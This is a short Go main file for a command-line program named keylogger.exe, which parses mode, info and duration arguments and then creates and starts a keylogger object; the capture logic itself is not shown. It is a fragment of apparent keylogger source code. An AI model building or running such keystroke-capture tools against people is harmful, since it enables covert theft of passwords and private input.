package main

import (
	"fmt"
	"os"
	"strconv"
)

func main() {

	args := os.Args

	if len(args) != 4 {
		fmt.Println("Bad command line arguments.\nUsage: .\\keylogger.exe [mode] [info] [time (s)]")
		fmt.Println("Pass a time of -1 to run indefinitely.")
	} else {
		mode, err := strconv.Atoi(args[1])
		if err != nil {
			panic(err)
		}

		time, err := strconv.Atoi(args[3])
		if err != nil {
			panic(err)
		}

		k := createKeylogger()
		k.setMode(mode, args[2])

		k.start(time)
	}

}

// create a keylogger with the default values
func createKeylogger() keylogger {
	return keylogger{}
}
